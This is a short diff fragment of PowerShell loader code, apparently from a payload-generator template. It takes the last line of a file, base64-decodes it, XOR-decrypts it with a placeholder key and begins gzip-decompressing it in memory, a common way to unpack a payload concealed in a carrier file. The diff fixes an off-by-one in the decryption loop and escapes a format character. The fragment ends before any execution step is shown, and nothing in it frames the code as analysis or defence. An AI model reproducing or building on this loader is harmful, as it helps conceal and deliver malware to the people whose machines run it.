@@ -2,7 +2,7 @@
 $lastline_var = $contents_var[$contents_var.Length - 1];
 $payload_var = [System.Convert]::FromBase64String($lastline_var);
 $key_var = [System.Convert]::FromBase64String('DECRYPTION_KEY');
-for ($i = 0; $i -le $payload_var.Length; $i++) { $payload_var[$i] = ($payload_var[$i] -bxor $key_var[$i % $key_var.Length]); };
+for ($i = 0; $i -le $payload_var.Length - 1; $i++) { $payload_var[$i] = ($payload_var[$i] -bxor $key_var[$i %% $key_var.Length]); };
 $msi_var = New-Object System.IO.MemoryStream(, $payload_var);
 $mso_var = New-Object System.IO.MemoryStream;
 $gs_var = New-Object System.IO.Compression.GZipStream($msi_var, [IO.Compression.CompressionMode]::Decompress);
